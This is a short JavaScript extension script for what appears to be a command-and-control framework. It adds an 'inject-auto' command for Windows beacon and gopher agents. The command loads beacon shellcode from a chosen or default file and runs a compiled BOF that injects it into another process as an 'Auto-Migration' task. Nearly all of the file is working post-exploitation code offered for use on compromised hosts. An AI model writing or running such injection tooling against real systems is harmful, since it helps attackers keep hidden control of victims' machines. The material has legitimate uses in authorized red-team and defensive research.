var metadata = {
    name: "Injection-BOF-Auto",
    description: "Auto-injection with automatic shellcode generation",
    author: "Codex",
    version: "1.0"
};

var cmd_inject_auto = ax.create_command(
    "inject-auto", 
    "inject-auto [/path/to/shellcode.bin]"
);

cmd_inject_auto.addArgFile("shellcode", false);

cmd_inject_auto.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    
    let shellcode_content = null;
    let arch = ax.arch(id);
    
    // Option 1: No changes needed in .axs if using 'inject-auto <path_to_shellcode>'
    // Option 2: If using a hardcoded shellcode path, specify it below:

    if (parsed_json["shellcode"] && parsed_json["shellcode"].length > 0) {
        shellcode_content = parsed_json["shellcode"];
        ax.console_message(id, "Info", "success", "Using shellcode from file");
    } else {

        // Default placeholder path

        let default_path = "/path/to/shellcode.bin";
        shellcode_content = ax.file_read(default_path);
        
        if (!shellcode_content || shellcode_content.length == 0) {
            ax.console_message(id, "Error", "error", "Shellcode not found. Please generate beacon shellcode and save to: " + default_path);
            ax.console_message(id, "Info", "info", "Or use: inject-auto /path/to/shellcode.bin");
            return false;
        }
        
        ax.console_message(id, "Info", "success", "Using default shellcode: " + default_path);
    }
    
    ax.console_message(id, "Info", "success", "Shellcode size: " + shellcode_content.length + " bytes");

    let bof_params = ax.bof_pack("bytes", [shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/inject_sec_auto." + arch + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Auto-Migration");
    return true;
});

var group_exec = ax.create_commands_group("Injection-BOF-Auto", [cmd_inject_auto]);
ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);



